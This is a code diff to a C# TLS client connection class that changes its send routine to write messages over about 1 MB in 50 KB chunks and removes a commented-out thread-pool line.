@@ -169,7 +169,6 @@ namespace Client.Connection
                             {
                                 Thread thread = new Thread(new ParameterizedThreadStart(Packet.Read));
                                 thread.Start(MS.ToArray());
-                                //ThreadPool.QueueUserWorkItem(Packet.Read, MS.ToArray());
                                 Buffer = new byte[4];
                                 MS.Dispose();
                                 MS = new MemoryStream();
@@ -203,11 +202,34 @@ namespace Client.Connection
                     }
 
                     byte[] buffersize = BitConverter.GetBytes(msg.Length);
-
                     TcpClient.Poll(-1, SelectMode.SelectWrite);
                     SslClient.Write(buffersize, 0, buffersize.Length);
-                    SslClient.Write(msg, 0, msg.Length);
-                    SslClient.Flush();
+
+                    if (msg.Length > 1000000) //1mb
+                    {
+                        Debug.WriteLine("send chunks");
+                        int chunkSize = 50 * 1024;
+                        byte[] chunk = new byte[chunkSize];
+                        using (MemoryStream buffereReader = new MemoryStream(msg))
+                        {
+                            BinaryReader binaryReader = new BinaryReader(buffereReader);
+                            int bytesToRead = (int)buffereReader.Length;
+                            do
+                            {
+                                chunk = binaryReader.ReadBytes(chunkSize);
+                                bytesToRead -= chunkSize;
+                                SslClient.Write(chunk, 0, chunk.Length);
+                                SslClient.Flush();
+                            } while (bytesToRead > 0);
+
+                            binaryReader.Dispose();
+                        }
+                    }
+                    else
+                    {
+                        SslClient.Write(msg, 0, msg.Length);
+                        SslClient.Flush();
+                    }
                 }
                 catch
                 {
